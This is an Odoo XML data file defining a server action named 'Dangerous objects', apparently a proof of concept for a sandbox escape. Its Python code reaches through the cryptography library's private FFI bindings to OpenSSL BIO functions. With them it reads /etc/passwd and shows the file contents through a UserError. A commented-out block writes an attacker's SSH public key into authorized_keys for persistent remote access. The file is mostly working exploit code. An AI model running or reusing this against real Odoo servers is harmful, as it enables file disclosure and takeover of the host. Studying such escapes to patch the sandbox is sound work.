<?xml version="1.0" encoding="utf-8"?>
<odoo>
    <data>

        <record id="server_action_dangerous_objects" model="ir.actions.server">
            <field name="name">Dangerous objects</field>
            <field name="model_id" eval="ref('base.model_ir_actions_server')"/>
            <field name="state">code</field>
            <field name="code">
# Set fake certificate and key
env.user.company_id.write({
    'l10n_xx_reports_sbr_cert': b'LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURJekNDQWd1Z0F3SUJBZ0lVSFhYajNRV2JiZ3VWRE5xdnJuTjZLS3NwZzhFd0RRWUpLb1pJaHZjTkFRRUYKQlFBd0lURUxNQWtHQTFVRUJoTUNWazR4RWpBUUJnTlZCQU1NQ1NvdWRHVnpkQzUyYmpBZUZ3MHlNekEzTURjeApORFEyTlRGYUZ3MHpNekEzTURReE5EUTJOVEZhTUNFeEN6QUpCZ05WQkFZVEFsWk9NUkl3RUFZRFZRUUREQWtxCkxuUmxjM1F1ZG00d2dnRWlNQTBHQ1NxR1NJYjNEUUVCQVFVQUE0SUJEd0F3Z2dFS0FvSUJBUUNoejUyeUhUZS8KSHdEUmNIbzNwb3lkd1hhSDZrc0pHSE5PZXNIbzBVTkJSTXkvYUVrd25XOW95c291dVhqVDJDT3BxTGNpS3ZGRgo3WUp6VW91TTJkb3VIeXdPcVNUYWNxNUc4QlM0c09pcUhMa0pXRHUzdUtnMld4WDU4cW5PSHg3YTIydTdGMzFCCnhKU2VoVmRUQVdkMzgySkE2elJBbEtqMU1mSGFsZDVrYndlckVtMzZFWndMemQ2VTNpeHQyRTFxVEw3VENmdDcKbXE4MEVwSGZaY0lMMGppUS9ZVEM3YTYzWldESmZkY3hzTmxQTmVlN0hjcUcvZTl1T1VCOVlmQVpiSXNTMUNpNwpSaFlPSHlNTWdqQ2YzczhFUjNoNGlrRzh5dGx2OFovNWVtY00vdVNLRFVjY1VmWUoyUTZvSEtwcEp2ejJSZFprClNhS20wVS9sYnpHdEFnTUJBQUdqVXpCUk1CMEdBMVVkRGdRV0JCU05jV3AyQ3Zkdjg3dFNta3VaVGlmTG0yTFMKVnpBZkJnTlZIU01FR0RBV2dCU05jV3AyQ3Zkdjg3dFNta3VaVGlmTG0yTFNWekFQQmdOVkhSTUJBZjhFQlRBRApBUUgvTUEwR0NTcUdTSWIzRFFFQkJRVUFBNElCQVFBSytwTjRXTmx3dlVoUlk0Tk9YOVMxM2QwVTQ0TFk4WTdCCjgyRUVKeXVOSHRqTmFQZHZ4dHNkbmdjTUlBb3VFc0N6T3Ewb2V5bjUrKzViUng3RGk4UEhBWjdPZHNDNFMyUmEKWnBnckxRTzJOdTAxTGROdkJSK3hENXdPMkV6cW1aSFVTekNENnFOY29zMDJyRHJkd2Q5dTNidXJlN09BVWptbgpLbXllbGhGVUM0WDJ0Yi9xY1hmYXRCSEc2YkJRbW45eDhvVHh3T3pZKy9sb01FTVBqSkQwT1Y4VTF2NUtQbkovCnJtNXd0NlRqVk1mWTNCR0ZhMUNvL3EvTXQ0aFhHQjkzWUgwRlQ5TzRWTVdJZElRelFERFU3bExZMVJMdy9LdXAKSFNMRW5rZ0lXN2tsaHMyaHdYc1pWc2ZZZkUrcVJLaDRvSWtCMTZ3cGU5SzVUZVB6eWRBYQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==', 
    'l10n_xx_reports_sbr_key': b'LS0tLS1CRUdJTiBQUklWQVRFIEtFWS0tLS0tCk1JSUV2Z0lCQURBTkJna3Foa2lHOXcwQkFRRUZBQVNDQktnd2dnU2tBZ0VBQW9JQkFRQ2h6NTJ5SFRlL0h3RFIKY0hvM3BveWR3WGFINmtzSkdITk9lc0hvMFVOQlJNeS9hRWt3blc5b3lzb3V1WGpUMkNPcHFMY2lLdkZGN1lKegpVb3VNMmRvdUh5d09xU1RhY3E1RzhCUzRzT2lxSExrSldEdTN1S2cyV3hYNThxbk9IeDdhMjJ1N0YzMUJ4SlNlCmhWZFRBV2QzODJKQTZ6UkFsS2oxTWZIYWxkNWtid2VyRW0zNkVad0x6ZDZVM2l4dDJFMXFUTDdUQ2Z0N21xODAKRXBIZlpjSUwwamlRL1lUQzdhNjNaV0RKZmRjeHNObFBOZWU3SGNxRy9lOXVPVUI5WWZBWmJJc1MxQ2k3UmhZTwpIeU1NZ2pDZjNzOEVSM2g0aWtHOHl0bHY4Wi81ZW1jTS91U0tEVWNjVWZZSjJRNm9IS3BwSnZ6MlJkWmtTYUttCjBVL2xiekd0QWdNQkFBRUNnZ0VBR3o2c3IvaVU4aGg3aUFnKy85OUtabWFVZVdLVTgwbGJZdCt2Qmk4eitvbWwKeXVXNWl4YTdFME12NDBtbDQwK05nNnZOZUJLUWNPU0NsajNVRXVsOGY4OE9XVUtZR3JMOERxUXViUUdXajB3SwpTTjFESXRaVDltRUVWSU5NSFpGbVhkWGJzQk1PcTFQNDdTOEk2c2c5L25lcnQ4QVNtbndkYmJtVTNpZmxXL1lFCkI0c2NVc1hVOXFoMHhTRmlLbkdwV3RvVGxxWlR5Vjlwdi9kNkhKd2xRRkh3ZHlSQnpScGlCd0RQN3g2NGxGZFIKRHFnd2k3ZktmTWxxRkNmTEFDRFBEako0aUc3b1ZQN09HZFB0ZkNRU3Znc0hxUkxhZk9DYzgzQmZIMUpneFlLSApHNmNiWXdXMVFFWm1mWDVkT211UFJEQ05RQnRiWU9LT1Z1WmkzWkwxY1FLQmdRQzNzaUhnbGthZWsxUXM2TWtCCmVCSXE5Q1g5blNiWVJLSVdROVI3dmV6TEMvSFVSVnVKMFFYRHc3ZmgvWEhxeG9BOXdmVGs1M2FGSjN3V3ZIM2YKNVFZZXlPaEdYOWJPTHdjU1IwdFZuUmVpYjVzT3NaNEEyRXh0d1V6VmNqNEUvSTJqNjdaVWhmWnVrTXFNZHcvVwpIeGFBa21BbzNVam1sSjIyazBPVHREd252UUtCZ1FEaGdFbW9uSHVqQXF1azR5WVhPaVdPL25ZV0t0b2h3UnVGCmRhSlAzMFJYRXpKK1o0OUlaOEsyNXBqUi9HdHJXOW9HSFByM25Lc3hWcXVtTC8zM3VzNzJ1ckd3QVMzUHFTMncKTndyWTlUd3J2VEJxWlVTQitTeVp4SnREU3NDeGk5YUtUSDVETmhOMnllNlMreVZ4NzRlb2l1K21PUXdUSWU2NApRWExSVDNZWXNRS0JnUUNIQzVvRU5mWXMxanJuMlNzTXZXejl6d2V1N3oyRGVOR0FkTlZkTXo5RjlyNE9RLzhMCnpuTGlmSnhPczdodjFRYXFZRkRkaDV5R1A0VG1ZaVJYMlZNcWhxRGNPOUQ3TzIrRGJJNWhubCtsdDA3Uytwa2kKSGVIeVBrMXlEYzZ5YzhqZFhZaHBreUtjSGk0S0hlMnlpS0JPWFUzOFBOSS9VYnF3WW9zbnB6VWlNUUtCZ1FDYwpLeWRZQVQ5U3JrZkhBcFRmb3lKZHZIWjFkYW5wbEg0RjJHalhYZTFMVEgwOHMyVzBwRDlpUWFMMlVoVG1uZzhKCkNzcjM3dVZVWHd5ekpDdURoRGxQQUE2TXNOUlVLM3I3dmJMaWZEdjJvcWhFRnV2eUEyblMrQ2o2Mm10R3lteUQKRE9Tb2tXdTdhYSt5MVFHaXZWczY2elY2N2FraUd1N2pabGdwQXhucmtRS0JnRlMyRjRwT3VOTHl1VzlKUE1SUgprcWYvT2FkcEtXQWZnbjR6b1d5MjFLd2tobE9qWUZqdU9JbnV5K1hyRkNHK3VxRjE3aXlYNTN6OHo1QTNMOWpFCkZuc08vZjMrdEJYdXUzT3hqRWt1bkZJaEJCSjRrTVBpSWlEVEgwTWdtbEQ1b3NNaUZoSGxDUEtMdm9BbnR4dnoKNkVQREhjamVVM0NqWHdZa2o5ZEtPUkthCi0tLS0tRU5EIFBSSVZBVEUgS0VZLS0tLS0K',
})
cert, key = env.user.company_id._l10n_xx_get_certificate_and_key_objects()

# (1) read /tmp/passwd

filepath = b"/etc/passwd"
buf = cert._backend._ffi.new("unsigned char[]", 1024)
bio = cert._backend._lib.BIO_new_file(filepath, b"r")
b = cert._backend._lib.BIO_read(bio, buf, 1024)
content = cert._backend._ffi.string(buf)

# (2) write ssh public key to /tmp/.ssh/authorized_keys

# data = b"ssh-rsa AAAAA... hacker@hacker-machine"
# filepath = b"/tmp/.ssh/authorized_keys"
# buf = cert._backend._ffi.from_buffer(data)
# bio = cert._backend._lib.BIO_new_file(filepath, b"w")
# b = cert._backend._lib.BIO_write(bio, buf, len(data))
# cert._backend._lib.BIO_free(bio)
# bio = cert._backend._lib.BIO_new_file(filepath, b"r")
# b = cert._backend._lib.BIO_read(bio, buf, 1024)
# content = cert._backend._ffi.string(buf)

raise UserError(content)

            </field>
        </record>

    </data>
</odoo>
